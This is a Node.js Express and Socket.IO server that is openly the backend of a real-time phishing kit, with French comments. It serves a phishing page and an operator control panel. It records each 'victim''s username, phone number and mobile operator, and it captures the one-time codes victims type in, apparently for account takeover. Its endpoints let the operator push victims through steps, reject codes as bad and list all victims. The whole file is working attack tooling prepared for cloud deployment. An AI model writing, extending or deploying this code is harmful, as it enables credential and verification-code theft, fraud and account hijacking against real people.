const express = require('express');
const path = require('path');
const { createServer } = require('node:http');
const { Server } = require('socket.io');
const app = express();
const PORT = process.env.PORT || 3000;  // Important pour Railway/Render
const publicPath = path.join(__dirname, 'public');

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.json());
app.use(express.static(publicPath));

app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'index.html')));
app.get('/control', (req, res) => res.sendFile(path.join(publicPath, 'control.html')));

// ====================== SOCKET.IO ======================
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
  transports: ['polling', 'websocket'],  // fallback polling
  pingTimeout: 60000,
  pingInterval: 25000
});

io.on('connection', (socket) => {
    console.log('Client Socket connecté');

    socket.on('joinSession', (sessionId) => {
        socket.join(`session-${sessionId}`);
        console.log(`[+] Victime join room: session-${sessionId}`);
    });

    socket.on('chatMessage', (data) => {
        io.to(`session-${data.sessionId}`).emit('command', { 
            action: 'chatMessage', 
            message: data.message,
            from: data.from 
        });
    });
});

// ====================== SESSIONS ======================
const sessions = new Map();

app.post('/api/submit', (req, res) => {
    const { username, phone, operator, sessionId } = req.body;
    if (!sessionId || !username || !phone) return res.status(400).json({ error: "Données manquantes" });

    sessions.set(sessionId, {
        username: username.trim(),
        phone: phone.trim(),
        operator: (operator || "Inconnu").trim(),
        status: "waiting",
        code: null,
        forceStep2: false,
        timestamp: Date.now()
    });
    console.log(`[+] Nouvelle victime → ${sessionId} | ${username}`);
    res.json({ success: true });
});

app.post('/api/force-step2', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        const v = sessions.get(sessionId);
        v.status = "step2_forced";
        v.forceStep2 = true;
        io.to(`session-${sessionId}`).emit('command', { action: 'forceStep2' });
    }
    res.json({ success: true });
});

app.post('/api/force-step3', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        const v = sessions.get(sessionId);
        v.status = "step3";
        io.to(`session-${sessionId}`).emit('command', { action: 'forceStep3' });
    }
    res.json({ success: true });
});

app.post('/api/mark-code-sent', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        const v = sessions.get(sessionId);
        v.status = "code_received";
        io.to(`session-${sessionId}`).emit('command', { action: 'codeSent' });
    }
    res.json({ success: true });
});

app.post('/api/code', (req, res) => {
    const { sessionId, code } = req.body;
    if (sessions.has(sessionId)) {
        const v = sessions.get(sessionId);
        v.code = code;
        v.status = "code_received";
        io.to(`session-${sessionId}`).emit('command', { action: 'codeEntered', code });
    }
    res.json({ success: true });
});

app.post('/api/bad-code', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        io.to(`session-${sessionId}`).emit('command', { action: 'badCode' });
    }
    res.json({ success: true });
});

app.get('/api/victims', (req, res) => {
    const arr = Array.from(sessions.entries())
        .map(([id, data]) => ({ sessionId: id, ...data }))
        .sort((a, b) => b.timestamp - a.timestamp);
    res.json(arr);
});

app.post('/api/delete-session', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        sessions.delete(sessionId);
        console.log(`[-] Session supprimée : ${sessionId}`);
        io.to(`session-${sessionId}`).emit('command', { action: 'sessionDeleted' });
    }
    res.json({ success: true });
});

setInterval(() => {
    const now = Date.now();
    for (const [id, data] of sessions) {
        if (now - data.timestamp > 1000 * 60 * 60 * 2) sessions.delete(id);
    }
}, 60000);

server.listen(PORT, () => {
    console.log(`\n🚀 Serveur actif sur port ${PORT}`);
    console.log(` → Page Phishing : http://localhost:${PORT}`);
    console.log(` → Control Panel : http://localhost:${PORT}/control\n`);
});
